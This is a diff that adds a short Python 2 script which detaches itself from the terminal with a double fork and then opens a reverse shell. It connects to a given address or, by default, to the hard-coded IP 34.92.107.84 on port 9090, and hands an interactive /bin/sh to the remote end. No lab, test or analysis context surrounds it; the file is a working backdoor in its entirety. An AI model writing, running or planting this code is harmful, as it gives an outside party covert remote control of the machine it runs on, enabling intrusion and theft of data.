@@ -1,0 +1,47 @@
+#!/usr/bin/python
+# coding=utf-8
+import os
+import sys
+import socket
+import subprocess
+
+
+def daemonize():
+    try:
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)
+    except OSError, e:
+        sys.stderr.write("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror))
+        sys.exit(1)
+
+    os.chdir("/")
+    os.umask(0)
+    os.setsid()
+
+    try:
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)
+    except OSError, e:
+        sys.stderr.write("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror))
+        sys.exit(1)
+
+
+def run(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    p = subprocess.call(["/bin/sh", "-i"])
+
+
+if __name__ == "__main__":
+    daemonize()
+    if len(sys.argv) == 3:
+        run(sys.argv[1], int(sys.argv[2]))
+    elif len(sys.argv) == 2:
+        run("34.92.107.84", int(sys.argv[1]))
+    else:
+        run("34.92.107.84", 9090)
